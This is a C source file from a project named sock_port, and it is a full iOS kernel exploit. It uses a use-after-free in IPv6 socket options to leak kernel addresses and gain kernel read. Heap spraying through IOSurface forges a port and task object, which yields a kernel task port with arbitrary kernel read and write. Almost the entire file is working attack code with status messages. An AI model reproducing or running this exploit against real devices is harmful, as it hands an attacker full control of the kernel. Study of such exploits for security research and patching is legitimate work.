//
//  exploit.c
//  sock_port
//
//  Created by Jake James on 7/17/19.
//  Copyright Â© 2019 Jake James. All rights reserved.
//

#include "exploit.h"
#include "kernel_memory.h"

// utilities to manipulate sockets
int set_minmtu(int sock, int *minmtu) {
    return setsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, sizeof(*minmtu));
}

int get_minmtu(int sock, int *minmtu) {
    socklen_t size = sizeof(*minmtu);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, &size);
}

int get_prefertempaddr(int sock, int *prefertempaddr) {
    socklen_t size = sizeof(*prefertempaddr);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefertempaddr, &size);
}

int set_prefertempaddr(int sock, int *prefertempaddr) {
    return setsockopt(sock, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefertempaddr, sizeof(*prefertempaddr));
}

int get_pktinfo(int sock, struct in6_pktinfo *pktinfo) {
    socklen_t size = sizeof(*pktinfo);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, &size);
}

int set_pktinfo(int sock, struct in6_pktinfo *pktinfo) {
    return setsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, sizeof(*pktinfo));
}

// free the pktopts struct of the socket to get ready for UAF
int free_socket_options(int sock) {
    return disconnectx(sock, 0, 0);
}

// return a socket we can UAF on
int get_socket() {
    int sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) {
        printf("[-] Can't get socket, error %d (%s)\n", errno, strerror(errno));
        return -1;
    }
    
    // allow setsockopt() after disconnect()
    struct so_np_extensions sonpx = {.npx_flags = SONPX_SETOPTSHUT, .npx_mask = SONPX_SETOPTSHUT};
    int ret = setsockopt(sock, SOL_SOCKET, SO_NP_EXTENSIONS, &sonpx, sizeof(sonpx));
    if (ret) {
        printf("[-] setsockopt() failed, error %d (%s)\n", errno, strerror(errno));
        return -1;
    }
    
    return sock;
}

// return a socket ready for UAF
int get_socket_with_dangling_options() {
    int socket = get_socket();
    
    int minmtu = -1;
    set_minmtu(socket, &minmtu);
    
    free_socket_options(socket);
    
    return socket;
}

mach_port_t new_port() {
    mach_port_t port;
    kern_return_t rv = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (rv) {
        printf("[-] Failed to allocate port (%s)\n", mach_error_string(rv));
        return MACH_PORT_NULL;
    }
    rv = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (rv) {
        printf("[-] Failed to insert right (%s)\n", mach_error_string(rv));
        return MACH_PORT_NULL;
    }
    return port;
}

// first primitive: leak the kernel address of a mach port
uint64_t find_port_via_uaf(mach_port_t port, int disposition) {
    // here we use the uaf as an info leak
    int sock = get_socket_with_dangling_options();
    
    for (int i = 0; i < 0x10000; i++) {
        // since the UAFd field is 192 bytes, we need 192/sizeof(uint64_t) pointers
        mach_port_t p = fill_kalloc_with_port_pointer(port, 192/sizeof(uint64_t), MACH_MSG_TYPE_COPY_SEND);
        
        int mtu;
        int pref;
        get_minmtu(sock, &mtu); // this is like doing rk32(options + 180);
        get_prefertempaddr(sock, &pref); // this like rk32(options + 184);
        
        // since we wrote 192/sizeof(uint64_t) pointers, reading like this would give us the second half of rk64(options + 184) and the fist half of rk64(options + 176)
        
        /*  from a hex dump:
         
         (lldb) p/x HexDump(options, 192)
         XX XX XX XX F0 FF FF FF  XX XX XX XX F0 FF FF FF  |  ................
         ...
         XX XX XX XX F0 FF FF FF  XX XX XX XX F0 FF FF FF  |  ................
                    |-----------||-----------|
                     minmtu here prefertempaddr here
         */
        
        // the ANDing here is done because for some reason stuff got wrong. say pref = 0xdeadbeef and mtu = 0, ptr would come up as 0xffffffffdeadbeef instead of 0x00000000deadbeef. I spent a day figuring out what was messing things up
        
        uint64_t ptr = (((uint64_t)mtu << 32) & 0xffffffff00000000) | ((uint64_t)pref & 0x00000000ffffffff);
        
        if (mtu >= 0xffffff00 && mtu != 0xffffffff && pref != 0xdeadbeef) {
            mach_port_destroy(mach_task_self(), p);
            close(sock);
            return ptr;
        }
        mach_port_destroy(mach_task_self(), p);
    }
    
    // close that socket.
    close(sock);
    return 0;
}

// function to cache our task port kernel address
uint64_t task_self_addr() {
    static uint64_t cached_task_self_addr = 0;
    if (cached_task_self_addr) return cached_task_self_addr;
    else return find_port_via_uaf(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
}

// second primitive: read 20 bytes from addr
void* read_20_via_uaf(uint64_t addr) {
    
    int sockets[128];
    for (int i = 0; i < 128; i++) {
        sockets[i] = get_socket_with_dangling_options();
    }
    
    // create a fake struct with our dangling port address as its pktinfo
    struct ip6_pktopts *fake_opts = calloc(1, sizeof(struct ip6_pktopts));
    fake_opts->ip6po_minmtu = 0x41424344; // give a number we can recognize
    fake_opts->ip6po_pktinfo = (struct in6_pktinfo*)addr;
    
    bool found = false;
    int found_at = -1;
    
    for (int i = 0; i < 20; i++) { // iterate through the sockets to find if we overwrote one
        spray_IOSurface((void *)fake_opts, sizeof(struct ip6_pktopts));
        
        for (int j = 0; j < 128; j++) {
            int minmtu = -1;
            get_minmtu(sockets[j], &minmtu);
            if (minmtu == 0x41424344) { // found it!
                found_at = j; // save its index
                found = true;
                break;
            }
        }
        if (found) break;
    }
    
    free(fake_opts);
    
    if (!found) {
        printf("[-] Failed to read kernel\n");
        return 0;
    }
    
    for (int i = 0; i < 128; i++) {
        if (i != found_at) {
            close(sockets[i]);
        }
    }
    
    void *buf = malloc(sizeof(struct in6_pktinfo));
    get_pktinfo(sockets[found_at], (struct in6_pktinfo *)buf);
    close(sockets[found_at]);
    
    return buf;
}

uint64_t rk64_via_uaf(uint64_t addr) {
    void *buf = read_20_via_uaf(addr);
    if (buf) {
        uint64_t r = *(uint64_t*)buf;
        free(buf);
        return r;
    }
    return 0;
}

static inline uint32_t mach_port_waitq_flags() {
    union waitq_flags waitq_flags = {};
    waitq_flags.waitq_type              = WQT_QUEUE;
    waitq_flags.waitq_fifo              = 1;
    waitq_flags.waitq_prepost           = 0;
    waitq_flags.waitq_irq               = 0;
    waitq_flags.waitq_isvalid           = 1;
    waitq_flags.waitq_turnstile_or_port = 1;
    return waitq_flags.flags;
}

mach_port_t get_tfp0() {
    printf("[!] exploit started!\n");
    
    offsets_init();
    
    kern_return_t ret = init_IOSurface();
    if (ret) {
        printf("[-] can't init IOSurface!\n");
        return MACH_PORT_NULL;
    }
    printf("[+] initialized IOSurface\n");
    
    // -------------- SETUP FIRST PRIMITIVES --------------
    uint64_t self_port_addr = task_self_addr(); // port leak primitive
    if (!self_port_addr) {
        printf("[-] failed to leak our task port address!\n");
        goto err;
    }
    
    printf("[i] our task port: 0x%llx\n", self_port_addr);
    
    uint64_t ipc_space_kernel = rk64_via_uaf(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
    if (!ipc_space_kernel) {
        printf("[-] kernel read primitive failed!\n");
        goto err;
    }
    printf("[i] ipc_space_kernel: 0x%llx\n", ipc_space_kernel);
    
    // -------------- SPRAY PORTS --------------
    printf("[*] spraying ports\n");
    
    mach_port_t before[0x2000];
    mach_port_t dangling;
    mach_port_t after[0x1000];
    
    for (int i = 0; i < 0x2000; i++) {
        before[i] = new_port();
        if (!before[i]) {
            printf("[-] Failed to create port!\n");
            goto err;
        }
    }
    dangling = new_port();
    if (!dangling) {
        printf("[-] Failed to create port!\n");
        goto err;
    }
    for (int i = 0; i < 0x1000; i++) {
        after[i] = new_port();
        if (!after[i]) {
            printf("[-] Failed to create port!\n");
            goto err;
        }
    }
    
    uint64_t dangling_addr = find_port_via_uaf(dangling, MACH_MSG_TYPE_COPY_SEND);
    if (!dangling_addr) {
        printf("[-] failed to leak dangling port address!\n");
        goto err;
    }
    
    // -------------- THIRD PRIMITIVE --------------

    // create a bunch of sockets
    int sockets[128];
    for (int i = 0; i < 128; i++) {
        sockets[i] = get_socket_with_dangling_options();
    }
    
    // create a fake struct with our dangling port address as its pktinfo
    struct ip6_pktopts *fake_opts = calloc(1, sizeof(struct ip6_pktopts));
    fake_opts->ip6po_minmtu = 0x41424344; // give a number we can recognize
    fake_opts->ip6po_pktinfo = (struct in6_pktinfo*)dangling_addr;
    
    bool found = false;
    int found_at = -1;
    
    for (int i = 0; i < 20; i++) { // iterate through the sockets to find if we overwrote one
        spray_IOSurface((void *)fake_opts, sizeof(struct ip6_pktopts));
        
        for (int j = 0; j < 128; j++) {
            int minmtu = -1;
            get_minmtu(sockets[j], &minmtu);
            if (minmtu == 0x41424344) { // found it!
                found_at = j; // save its index
                found = true;
                break;
            }
        }
        if (found) break;
    }
    
    free(fake_opts);
    
    if (!found) {
        printf("[-] failed to setup nulling primitive\n");
        goto err;
    }
    
    for (int i = 0; i < 128; i++) {
        if (i != found_at) {
            close(sockets[i]);
        }
    }
    
    // this is what we'll write to our dangling port, we can't write anything we want but we can write 0s, that's enough to null out the ref count!
    struct in6_pktinfo *buf = malloc(sizeof(struct in6_pktinfo));
    memset(buf, 0, sizeof(struct in6_pktinfo));
    buf->ipi6_ifindex = 1;
    
    // -------------- SETUP FAKE PORT --------------
    
    kport_t *fakeport = malloc(0x4000);
    mlock((void *)fakeport, 0x4000);
    bzero((void *)fakeport, 0x4000);
    
    ktask_t *fake_task = malloc(0x600); // task is about 0x568 or some shit
    bzero((void *)fake_task, 0x600);
    fake_task->ref_count = 0xff;
    
    fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    fakeport->ip_references = 0xd00d;
    fakeport->ip_lock.type = 0x11;
    fakeport->ip_messages.port.receiver_name = 1;
    fakeport->ip_messages.port.msgcount = 0;
    fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
    fakeport->ip_messages.port.waitq.flags = mach_port_waitq_flags();
    fakeport->ip_srights = 99;
    fakeport->ip_kobject = (uint64_t)fake_task;
    fakeport->ip_receiver = ipc_space_kernel;
    
#define FILL_MEMSIZE 0x4000000
    int spray_qty = FILL_MEMSIZE / pagesize; // # of pages to spray
    
    int spray_size = (int)((5 * sizeof(uint32_t)) + (spray_qty * ((4 * sizeof(uint32_t)) + pagesize)));
    uint32_t *spray_data = malloc(spray_size); // header + (spray_qty * (item_header + pgsize))
    bzero((void *)spray_data, spray_size);
    
    uint32_t *spray_cur = spray_data;
    
    *(spray_cur++) = IOSurface_id;
    *(spray_cur++) = 0x0;
    *(spray_cur++) = kOSSerializeMagic;
    *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeArray | 1;
    *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeDictionary | spray_qty;
    
    for (int i = 0; i < spray_qty; i++) {
        *(spray_cur++) = kOSSerializeSymbol | 5;
        *(spray_cur++) = transpose(i);
        *(spray_cur++) = 0x0;
        *(spray_cur++) = (uint32_t)((i + 1 >= spray_qty ? kOSSerializeEndCollection : 0) | kOSSerializeString | (pagesize - 1));
        
        for (uintptr_t ptr = (uintptr_t)spray_cur, end = ptr + pagesize;
             ptr + sizeof(kport_t) <= end;
             ptr += sizeof(kport_t)) {
            bcopy((const void *)fakeport, (void *)ptr, sizeof(kport_t));
        }
        
        spray_cur += (pagesize / sizeof(uint32_t));
    }
    
    // -------------- FREE THE PORTS --------------
    
    for (int i = 0; i < 0x1000; i++) {
        mach_port_destroy(mach_task_self(), after[i]);
    }
    
    set_pktinfo(sockets[found_at], buf); // make references zero
    mach_port_insert_right(mach_task_self(), dangling, dangling, MACH_MSG_TYPE_MAKE_SEND); // call this so kernel frees it
    
    for (int i = 0; i < 0x2000; i++) {
        mach_port_destroy(mach_task_self(), before[i]);
    }
    
    trigger_gc();
    
    // -------------- SEND!!! --------------
    uint32_t dummy = 0;
    size_t size = sizeof(dummy);
    ret = IOConnectCallStructMethod(IOSurfaceRootUserClient, (uint32_t)IOSURFACE_SET_VALUE, spray_data, spray_size, &dummy, &size);
    free(spray_data);
    
    close(sockets[found_at]);
    free(buf);
    
    if (ret != KERN_SUCCESS) {
        printf("[-] setValue(): %s", mach_error_string(ret));
        goto err;
    }
    
    uint64_t *read_addr_ptr = (uint64_t *)((uint64_t)fake_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    
#define kr32(addr, value)\
    *read_addr_ptr = addr - koffset(KSTRUCT_OFFSET_PROC_PID);\
    value = 0x0;\
    ret = pid_for_task(dangling, (int *)&value);
    
    uint32_t read64_tmp;
#define kr64(addr, value)\
    kr32(addr + 0x4, read64_tmp);\
    kr32(addr, value);\
    value = value | ((uint64_t)read64_tmp << 32)
    
    // -------------- PLS WORK --------------
    
    uint64_t struct_task;
    kr64(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), struct_task);
    if (!struct_task) {
        printf("[-] kernel read failed!\n");
        goto err;
    }
    
    printf("[!] READING VIA FAKE PORT WORKED? 0x%llx\n", struct_task);
    printf("[+] Let's steal that kernel task port!\n");
    
    // -------------- TFP0! --------------
    
    uint64_t kernel_vm_map = 0;
    
    while (struct_task != 0) {
        uint64_t bsd_info;
        kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO), bsd_info);
        if (!bsd_info) {
            printf("[-] kernel read failed!\n");
            goto err;
        }
        
        uint32_t pid;
        kr32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID), pid);
        
        if (pid == 0) {
            uint64_t vm_map;
            kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP), vm_map);
            if (!vm_map) {
                printf("[-] kernel read failed!\n");
                goto err;
            }
            
            kernel_vm_map = vm_map;
            break;
        }
        
        kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV), struct_task);
    }
    
    if (!kernel_vm_map) {
        printf("[-] failed to find kernel's vm_map\n");
        goto err;
    }
    
    printf("[i] kernel_vm_map: 0x%llx\n", kernel_vm_map);
    
    fake_task->lock.data = 0x0;
    fake_task->lock.type = 0x22;
    fake_task->ref_count = 100;
    fake_task->active = 1;
    fake_task->map = kernel_vm_map;
    *(uint32_t *)((uint64_t)fake_task + 0xd8) = 1;
    
    init_kernel_memory(dangling);
    
    uint64_t addr = kalloc(8);
    if (!addr) {
        printf("[-] seems like tfp0 port didn't work?\n");
        goto err;
    }
    
    printf("[*] allocated: 0x%llx\n", addr);
    wk64(addr, 0x4141414141414141);
    uint64_t readb = rk64(addr);
    kfree(addr, 8);
    printf("[*] read back: 0x%llx\n", readb);
    
    if (readb != 0x4141414141414141) {
        printf("[-] read back value didn't match\n");
        goto err;
    }
    
    printf("[*] creating safer port\n");
    
    mach_port_t new_tfp0 = new_port();
    if (!new_tfp0) {
        printf("[-] failed to allocate new tfp0 port\n");
        goto err;
    }
    
    uint64_t new_addr = find_port(new_tfp0, self_port_addr);
    if (!new_addr) {
        printf("[-] failed to find new tfp0 port address\n");
        goto err;
    }
    
    uint64_t faketask = kalloc(0x600);
    if (!faketask) {
        printf("[-] failed to kalloc faketask\n");
        goto err;
    }
    
    kwrite(faketask, fake_task, 0x600);
    fakeport->ip_kobject = faketask;
    
    kwrite(new_addr, (const void*)fakeport, sizeof(kport_t));
    
    printf("[*] testing new tfp0 port\n");
    
    init_kernel_memory(new_tfp0);
    
    addr = kalloc(8);
    if (!addr) {
        printf("[-] seems like the new tfp0 port didn't work?\n");
        goto err;
    }
    
    printf("[+] tfp0: 0x%x\n", new_tfp0);
    printf("[*] allocated: 0x%llx\n", addr);
    wk64(addr, 0x4141414141414141);
    readb = rk64(addr);
    kfree(addr, 8);
    printf("[*] read back: 0x%llx\n", readb);
    
    if (readb != 0x4141414141414141) {
        printf("[-] read back value didn't match\n");
        goto err;
    }
    
    mach_port_destroy(mach_task_self(), dangling);
    deinit_IOSurface();
    return new_tfp0;
err:;
    deinit_IOSurface();
    return MACH_PORT_NULL;
}
